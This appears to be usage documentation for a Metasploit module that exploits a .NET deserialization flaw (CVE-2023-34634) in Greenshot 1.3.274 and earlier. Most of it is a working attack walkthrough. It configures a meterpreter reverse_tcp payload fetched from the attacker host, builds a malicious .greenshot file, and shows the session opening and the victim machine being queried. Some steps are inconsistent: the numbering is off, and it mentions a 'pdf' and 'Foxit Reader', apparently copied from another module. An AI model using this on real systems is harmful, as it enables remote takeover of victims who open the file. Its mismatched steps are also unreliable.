## Description

There exists a .NET deserialization vulnerability in Greenshot version 1.3.274
and below.  The deserialization allows the execution of commands when a user opens
a Greenshot file.  The commands execute under the same permissions as the Greenshot
service.  Typically this is as the logged in user.

## Vulnerable Application

[Greenshot v1.3.274](https://github.com/greenshot/greenshot/releases/download/v1.3.274/Greenshot-INSTALLER-1.3.274-UNSTABLE.exe) and earlier

## Verification Steps

1. `./msfconsole`
2. `set payload cmd/windows/http/x64/meterpreter/reverse_tcp`
3. `set FETCH_SRVHOST <callback ip>`
4. `set FETCH_WRITABLE_DIR %TEMP%`
4. `set LHOST <callback ip>`
5. `set DisablePayloadhandler false`
6. `set wfsdelay 600`
7. `run`
9. Copy pdf over to target, ensuring that the `.greenshot` extension is preserved and open it.

Note: The target machine running Foxit Reader will need network access to the system hosting the exe.

## Scenarios

### Greenshot v1.3.274 running on Windows 10 Pro x64 2004

```
msf6 > use exploit/windows/fileformat/greenshot_deserialize_cve_2023_34634
[*] No payload configured, defaulting to cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp
payload => cmd/windows/http/x64/meterpreter/reverse_tcp
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > set FETCH_SRVHOST 10.5.135.201
FETCH_SRVHOST => 10.5.135.201
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > set LHOST 10.5.135.201
LHOST => 10.5.135.201
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > set FETCH_WRITABLE_DIR %TEMP%
FETCH_WRITABLE_DIR => %TEMP%
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > set DisablePayloadHandler false
DisablePayloadHandler => false
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > set wfsdelay 600
wfsdelay => 600
msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > show options

Module options (exploit/windows/fileformat/greenshot_deserialize_cve_2023_34634):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME                   no        The file name.
   PNG_FILE                   no        PNG file to use


Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      tsuAqVhW         no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST       10.5.135.201     yes       Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               10.5.135.201     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command



View the full module info with the info, or info -d command.

msf6 exploit(windows/fileformat/greenshot_deserialize_cve_2023_34634) > run

[*] Started reverse TCP handler on 10.5.135.201:4444 
[+] QsMBQrLmW.greenshot stored at /home/tmoose/.msf4/local/QsMBQrLmW.greenshot
[*] Sending stage (200774 bytes) to 10.5.132.130
[*] Meterpreter session 1 opened (10.5.135.201:4444 -> 10.5.132.130:50221) at 2023-08-03 18:27:21 -0500

meterpreter > sysinfo
Computer        : DESKTOP-KAI0M8D
OS              : Windows 10 (10.0 Build 19041).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: DESKTOP-KAI0M8D\msfuser
meterpreter > 

```
